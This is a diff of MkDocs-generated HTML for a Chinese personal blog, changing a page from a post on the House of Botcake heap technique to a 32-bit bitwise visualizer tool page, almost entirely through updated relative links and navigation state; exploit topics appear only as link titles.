@@ -8,28 +8,28 @@
       
       
       
-        <link rel="canonical" href="https://maple-pwn.github.io/pwn/house/%E5%85%B3%E4%BA%8Ehouse-of-botcake%E7%9A%84%E7%A0%94%E7%A9%B6/">
+        <link rel="canonical" href="https://maple-pwn.github.io/tools/bit32_visualizer/">
       
       
-        <link rel="prev" href="../%E5%85%B3%E4%BA%8Ehouse-of-kiwi%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+        <link rel="prev" href="../../sth/proj/">
       
       
-        <link rel="next" href="../../wp/basectf/">
+        <link rel="next" href="../../sth/ssh/">
       
       
-      <link rel="icon" href="../../../images/logo.svg">
+      <link rel="icon" href="../../images/logo.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
     
     
       
-        <title>关于house_of_botcake的研究 - Maple's blog</title>
+        <title>32位位运算可视化工具 - Maple's blog</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.e53b48f4.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -48,17 +48,17 @@
       
     
     
-      <link rel="stylesheet" href="../../../resources/css/extra.css">
+      <link rel="stylesheet" href="../../resources/css/extra.css">
     
-      <link rel="stylesheet" href="../../../resources/css/tittle.css">
+      <link rel="stylesheet" href="../../resources/css/tittle.css">
     
-      <link rel="stylesheet" href="../../../resources/css/read-metrics.css">
+      <link rel="stylesheet" href="../../resources/css/read-metrics.css">
     
-      <link rel="stylesheet" href="../../../resources/css/leftsidebar.css">
+      <link rel="stylesheet" href="../../resources/css/leftsidebar.css">
     
       <link rel="stylesheet" href="https://static.zeoseven.com/zsft/292/main/result.css">
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -84,7 +84,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#32" class="md-skip">
           跳转至
         </a>
       
@@ -98,9 +98,9 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href="../../.." title="Maple&#39;s blog" class="md-header__button md-logo" aria-label="Maple's blog" data-md-component="logo">
+    <a href="../.." title="Maple&#39;s blog" class="md-header__button md-logo" aria-label="Maple's blog" data-md-component="logo">
       
-  <img src="../../../images/logo.svg" alt="logo">
+  <img src="../../images/logo.svg" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -117,7 +117,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              关于house_of_botcake的研究
+              32位位运算可视化工具
             
           </span>
         </div>
@@ -218,7 +218,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../mysys/pre/" class="md-tabs__link">
+        <a href="../../mysys/pre/" class="md-tabs__link">
           
   
   
@@ -240,7 +240,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../LLMZtH/pre/" class="md-tabs__link">
+        <a href="../../LLMZtH/pre/" class="md-tabs__link">
           
   
   
@@ -262,7 +262,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../study/pre/" class="md-tabs__link">
+        <a href="../../study/pre/" class="md-tabs__link">
           
   
   
@@ -291,7 +291,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../READ/paperread/mHC/" class="md-tabs__link">
+        <a href="../../READ/paperread/mHC/" class="md-tabs__link">
           
   
   
@@ -312,13 +312,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="../../pre/" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../../pwn/pre/" class="md-tabs__link">
           
   
   
@@ -340,7 +338,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../thinking/pre/" class="md-tabs__link">
+        <a href="../../thinking/pre/" class="md-tabs__link">
           
   
   
@@ -358,11 +356,13 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../../../sth/proj/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../sth/proj/" class="md-tabs__link">
           
   
   
@@ -398,9 +398,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="Maple&#39;s blog" class="md-nav__button md-logo" aria-label="Maple's blog" data-md-component="logo">
+    <a href="../.." title="Maple&#39;s blog" class="md-nav__button md-logo" aria-label="Maple's blog" data-md-component="logo">
       
-  <img src="../../../images/logo.svg" alt="logo">
+  <img src="../../images/logo.svg" alt="logo">
 
     </a>
     Maple's blog
@@ -472,7 +472,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../mysys/pre/" class="md-nav__link">
+      <a href="../../mysys/pre/" class="md-nav__link">
         
   
   
@@ -495,7 +495,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../mysys/01/" class="md-nav__link">
+      <a href="../../mysys/01/" class="md-nav__link">
         
   
   
@@ -518,7 +518,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../mysys/02/" class="md-nav__link">
+      <a href="../../mysys/02/" class="md-nav__link">
         
   
   
@@ -541,7 +541,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../mysys/03/" class="md-nav__link">
+      <a href="../../mysys/03/" class="md-nav__link">
         
   
   
@@ -564,7 +564,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../mysys/04/" class="md-nav__link">
+      <a href="../../mysys/04/" class="md-nav__link">
         
   
   
@@ -587,7 +587,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../mysys/05/" class="md-nav__link">
+      <a href="../../mysys/05/" class="md-nav__link">
         
   
   
@@ -610,7 +610,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../mysys/06/" class="md-nav__link">
+      <a href="../../mysys/06/" class="md-nav__link">
         
   
   
@@ -691,7 +691,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/pre/" class="md-nav__link">
+      <a href="../../LLMZtH/pre/" class="md-nav__link">
         
   
   
@@ -777,7 +777,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/1-3/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/1-3/" class="md-nav__link">
         
   
   
@@ -800,7 +800,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/4/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/4/" class="md-nav__link">
         
   
   
@@ -823,7 +823,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/5/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/5/" class="md-nav__link">
         
   
   
@@ -846,7 +846,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/6/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/6/" class="md-nav__link">
         
   
   
@@ -869,7 +869,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/7/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/7/" class="md-nav__link">
         
   
   
@@ -892,7 +892,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/8/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/8/" class="md-nav__link">
         
   
   
@@ -915,7 +915,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/9/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/9/" class="md-nav__link">
         
   
   
@@ -938,7 +938,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/10/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/10/" class="md-nav__link">
         
   
   
@@ -961,7 +961,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/11/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/11/" class="md-nav__link">
         
   
   
@@ -984,7 +984,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/ML/12/" class="md-nav__link">
+      <a href="../../LLMZtH/ML/12/" class="md-nav__link">
         
   
   
@@ -1060,7 +1060,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/RL/1/" class="md-nav__link">
+      <a href="../../LLMZtH/RL/1/" class="md-nav__link">
         
   
   
@@ -1144,7 +1144,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/DL/1/" class="md-nav__link">
+      <a href="../../LLMZtH/DL/1/" class="md-nav__link">
         
   
   
@@ -1167,7 +1167,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/DL/images-class/" class="md-nav__link">
+      <a href="../../LLMZtH/DL/images-class/" class="md-nav__link">
         
   
   
@@ -1190,7 +1190,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/DL/images-class-py/" class="md-nav__link">
+      <a href="../../LLMZtH/DL/images-class-py/" class="md-nav__link">
         
   
   
@@ -1213,7 +1213,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/DL/linear/" class="md-nav__link">
+      <a href="../../LLMZtH/DL/linear/" class="md-nav__link">
         
   
   
@@ -1236,7 +1236,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../LLMZtH/DL/linear-py/" class="md-nav__link">
+      <a href="../../LLMZtH/DL/linear-py/" class="md-nav__link">
         
   
   
@@ -1337,7 +1337,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/pre/" class="md-nav__link">
+      <a href="../../study/pre/" class="md-nav__link">
         
   
   
@@ -1407,7 +1407,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/dw/" class="md-nav__link">
+      <a href="../../study/dw/" class="md-nav__link">
         
   
   
@@ -1430,7 +1430,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/dw2/" class="md-nav__link">
+      <a href="../../study/dw2/" class="md-nav__link">
         
   
   
@@ -1461,7 +1461,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/gt/" class="md-nav__link">
+      <a href="../../study/gt/" class="md-nav__link">
         
   
   
@@ -1484,7 +1484,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/lisan/" class="md-nav__link">
+      <a href="../../study/lisan/" class="md-nav__link">
         
   
   
@@ -1554,7 +1554,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/cs_final/" class="md-nav__link">
+      <a href="../../study/cs_final/" class="md-nav__link">
         
   
   
@@ -1577,7 +1577,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/cs_exam/" class="md-nav__link">
+      <a href="../../study/cs_exam/" class="md-nav__link">
         
   
   
@@ -1608,7 +1608,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/cs_e/" class="md-nav__link">
+      <a href="../../study/cs_e/" class="md-nav__link">
         
   
   
@@ -1631,7 +1631,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/mao/" class="md-nav__link">
+      <a href="../../study/mao/" class="md-nav__link">
         
   
   
@@ -1654,7 +1654,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/eda/" class="md-nav__link">
+      <a href="../../study/eda/" class="md-nav__link">
         
   
   
@@ -1677,7 +1677,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/asm/" class="md-nav__link">
+      <a href="../../study/asm/" class="md-nav__link">
         
   
   
@@ -1747,7 +1747,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/huibian/" class="md-nav__link">
+      <a href="../../study/huibian/" class="md-nav__link">
         
   
   
@@ -1770,7 +1770,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../study/asm_homework/" class="md-nav__link">
+      <a href="../../study/asm_homework/" class="md-nav__link">
         
   
   
@@ -1900,7 +1900,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../READ/paperread/mHC/" class="md-nav__link">
+      <a href="../../READ/paperread/mHC/" class="md-nav__link">
         
   
   
@@ -1923,7 +1923,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../READ/paperread/cs231n/" class="md-nav__link">
+      <a href="../../READ/paperread/cs231n/" class="md-nav__link">
         
   
   
@@ -1958,10 +1958,8 @@
       
   
   
-    
   
   
-  
     
     
       
@@ -1983,20 +1981,17 @@
     
     
       
-        
-        
-      
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
             
   
   
@@ -2009,7 +2004,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             pwn篇
@@ -2023,7 +2018,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../pre/" class="md-nav__link">
+      <a href="../../pwn/pre/" class="md-nav__link">
         
   
   
@@ -2046,7 +2041,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../tricks/" class="md-nav__link">
+      <a href="../../pwn/tricks/" class="md-nav__link">
         
   
   
@@ -2126,7 +2121,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Stack/%E6%B1%87%E7%BC%96%E9%80%9F%E9%80%9A/" class="md-nav__link">
+      <a href="../../pwn/Stack/%E6%B1%87%E7%BC%96%E9%80%9F%E9%80%9A/" class="md-nav__link">
         
   
   
@@ -2149,7 +2144,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Stack/ASLR/" class="md-nav__link">
+      <a href="../../pwn/Stack/ASLR/" class="md-nav__link">
         
   
   
@@ -2172,7 +2167,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Stack/Canary/" class="md-nav__link">
+      <a href="../../pwn/Stack/Canary/" class="md-nav__link">
         
   
   
@@ -2195,7 +2190,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Stack/PIE%E7%BB%95%E8%BF%87/" class="md-nav__link">
+      <a href="../../pwn/Stack/PIE%E7%BB%95%E8%BF%87/" class="md-nav__link">
         
   
   
@@ -2218,7 +2213,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Stack/fmt-all-in-one/" class="md-nav__link">
+      <a href="../../pwn/Stack/fmt-all-in-one/" class="md-nav__link">
         
   
   
@@ -2241,7 +2236,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Stack/shellcode-all-in-one/" class="md-nav__link">
+      <a href="../../pwn/Stack/shellcode-all-in-one/" class="md-nav__link">
         
   
   
@@ -2264,7 +2259,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Stack/SROP/" class="md-nav__link">
+      <a href="../../pwn/Stack/SROP/" class="md-nav__link">
         
   
   
@@ -2352,7 +2347,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Heap/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+      <a href="../../pwn/Heap/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
         
   
   
@@ -2375,7 +2370,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Heap/%E5%90%84%E4%B8%AA%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B/" class="md-nav__link">
+      <a href="../../pwn/Heap/%E5%90%84%E4%B8%AA%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B/" class="md-nav__link">
         
   
   
@@ -2398,7 +2393,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Heap/%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+      <a href="../../pwn/Heap/%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
         
   
   
@@ -2421,7 +2416,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Heap/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B8%AD%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E6%AD%A5%E9%AA%A4/" class="md-nav__link">
+      <a href="../../pwn/Heap/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B8%AD%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E6%AD%A5%E9%AA%A4/" class="md-nav__link">
         
   
   
@@ -2444,7 +2439,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Heap/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" class="md-nav__link">
+      <a href="../../pwn/Heap/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" class="md-nav__link">
         
   
   
@@ -2467,7 +2462,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Heap/%E5%A0%86%E5%90%84%E7%B1%BB%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/" class="md-nav__link">
+      <a href="../../pwn/Heap/%E5%A0%86%E5%90%84%E7%B1%BB%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/" class="md-nav__link">
         
   
   
@@ -2490,7 +2485,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Heap/%E4%BE%8B%E9%A2%98%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+      <a href="../../pwn/Heap/%E4%BE%8B%E9%A2%98%E8%AE%B0%E5%BD%95/" class="md-nav__link">
         
   
   
@@ -2574,7 +2569,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../IO_FILE/_IO_FILE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+      <a href="../../pwn/IO_FILE/_IO_FILE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
         
   
   
@@ -2597,7 +2592,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../IO_FILE/IO_FILE%E6%BA%90%E7%A0%81/" class="md-nav__link">
+      <a href="../../pwn/IO_FILE/IO_FILE%E6%BA%90%E7%A0%81/" class="md-nav__link">
         
   
   
@@ -2620,7 +2615,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../IO_FILE/fopen/" class="md-nav__link">
+      <a href="../../pwn/IO_FILE/fopen/" class="md-nav__link">
         
   
   
@@ -2643,7 +2638,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../IO_FILE/fread/" class="md-nav__link">
+      <a href="../../pwn/IO_FILE/fread/" class="md-nav__link">
         
   
   
@@ -2666,7 +2661,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../IO_FILE/%E5%81%9A%E9%A2%98%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+      <a href="../../pwn/IO_FILE/%E5%81%9A%E9%A2%98%E6%8A%80%E5%B7%A7/" class="md-nav__link">
         
   
   
@@ -2694,10 +2689,8 @@
                 
   
   
-    
   
   
-  
     
     
       
@@ -2718,11 +2711,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_6" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_6" >
         
           
           <label class="md-nav__link" for="__nav_5_6" id="__nav_5_6_label" tabindex="0">
@@ -2738,7 +2731,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_6_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_6_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5_6">
             <span class="md-nav__icon md-icon"></span>
             House系列
@@ -2752,7 +2745,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E5%85%B3%E4%BA%8Ehouse%20of%20apple1%E7%9A%84%E7%A0%94%E7%A9%B6/" class="md-nav__link">
+      <a href="../../pwn/house/%E5%85%B3%E4%BA%8Ehouse%20of%20apple1%E7%9A%84%E7%A0%94%E7%A9%B6/" class="md-nav__link">
         
   
   
@@ -2775,7 +2768,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E5%85%B3%E4%BA%8Ehouse-of-apple2%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+      <a href="../../pwn/house/%E5%85%B3%E4%BA%8Ehouse-of-apple2%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
         
   
   
@@ -2798,7 +2791,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E5%85%B3%E4%BA%8Ehouse%20of%20cat%20%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+      <a href="../../pwn/house/%E5%85%B3%E4%BA%8Ehouse%20of%20cat%20%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
         
   
   
@@ -2821,7 +2814,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E5%85%B3%E4%BA%8Ehouse-of-kiwi%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+      <a href="../../pwn/house/%E5%85%B3%E4%BA%8Ehouse-of-kiwi%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
         
   
   
@@ -2841,32 +2834,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    House of Botcake
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../pwn/house/%E5%85%B3%E4%BA%8Ehouse-of-botcake%E7%9A%84%E7%A0%94%E7%A9%B6/" class="md-nav__link">
         
   
   
@@ -2877,62 +2848,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#0xff" class="md-nav__link">
-    <span class="md-ellipsis">
-      0xff 背景
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#0x00" class="md-nav__link">
-    <span class="md-ellipsis">
-      0x00 源码分析
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#0x01-attack" class="md-nav__link">
-    <span class="md-ellipsis">
-      0x01 attack
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#0x02" class="md-nav__link">
-    <span class="md-ellipsis">
-      0x02 总结
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -3022,7 +2937,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/basectf/" class="md-nav__link">
+      <a href="../../pwn/wp/basectf/" class="md-nav__link">
         
   
   
@@ -3045,7 +2960,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/moectf/" class="md-nav__link">
+      <a href="../../pwn/wp/moectf/" class="md-nav__link">
         
   
   
@@ -3068,7 +2983,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/isctf2024/" class="md-nav__link">
+      <a href="../../pwn/wp/isctf2024/" class="md-nav__link">
         
   
   
@@ -3091,7 +3006,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/ghctf/" class="md-nav__link">
+      <a href="../../pwn/wp/ghctf/" class="md-nav__link">
         
   
   
@@ -3114,7 +3029,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/xyctf/" class="md-nav__link">
+      <a href="../../pwn/wp/xyctf/" class="md-nav__link">
         
   
   
@@ -3137,7 +3052,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/tgctf/" class="md-nav__link">
+      <a href="../../pwn/wp/tgctf/" class="md-nav__link">
         
   
   
@@ -3160,7 +3075,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/NPCCTF/" class="md-nav__link">
+      <a href="../../pwn/wp/NPCCTF/" class="md-nav__link">
         
   
   
@@ -3183,7 +3098,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/ctfshow/" class="md-nav__link">
+      <a href="../../pwn/wp/ctfshow/" class="md-nav__link">
         
   
   
@@ -3206,7 +3121,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/whuctf2024/" class="md-nav__link">
+      <a href="../../pwn/wp/whuctf2024/" class="md-nav__link">
         
   
   
@@ -3229,7 +3144,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/whuctf2025/" class="md-nav__link">
+      <a href="../../pwn/wp/whuctf2025/" class="md-nav__link">
         
   
   
@@ -3252,7 +3167,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/%E5%BC%BA%E7%BD%91%E6%9D%AF/" class="md-nav__link">
+      <a href="../../pwn/wp/%E5%BC%BA%E7%BD%91%E6%9D%AF/" class="md-nav__link">
         
   
   
@@ -3275,7 +3190,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/polarD%26N/polarD%26N/" class="md-nav__link">
+      <a href="../../pwn/wp/polarD%26N/polarD%26N/" class="md-nav__link">
         
   
   
@@ -3349,7 +3264,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%881-20%E9%A2%98%EF%BC%89/" class="md-nav__link">
+      <a href="../../pwn/wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%881-20%E9%A2%98%EF%BC%89/" class="md-nav__link">
         
   
   
@@ -3372,7 +3287,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8821-40%E9%A2%98%EF%BC%89/" class="md-nav__link">
+      <a href="../../pwn/wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8821-40%E9%A2%98%EF%BC%89/" class="md-nav__link">
         
   
   
@@ -3395,7 +3310,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8841-60%E9%A2%98%EF%BC%89/" class="md-nav__link">
+      <a href="../../pwn/wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8841-60%E9%A2%98%EF%BC%89/" class="md-nav__link">
         
   
   
@@ -3418,7 +3333,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8861-80%E9%A2%98%EF%BC%89/" class="md-nav__link">
+      <a href="../../pwn/wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8861-80%E9%A2%98%EF%BC%89/" class="md-nav__link">
         
   
   
@@ -3513,7 +3428,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../thinking/pre/" class="md-nav__link">
+      <a href="../../thinking/pre/" class="md-nav__link">
         
   
   
@@ -3536,7 +3451,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../thinking/I/" class="md-nav__link">
+      <a href="../../thinking/I/" class="md-nav__link">
         
   
   
@@ -3559,7 +3474,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../thinking/AI/" class="md-nav__link">
+      <a href="../../thinking/AI/" class="md-nav__link">
         
   
   
@@ -3586,8 +3501,10 @@
       
   
   
+    
   
   
+  
     
     
       
@@ -3601,17 +3518,20 @@
     
     
       
+        
+        
+      
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
         
           
-          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
             
   
   
@@ -3624,7 +3544,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
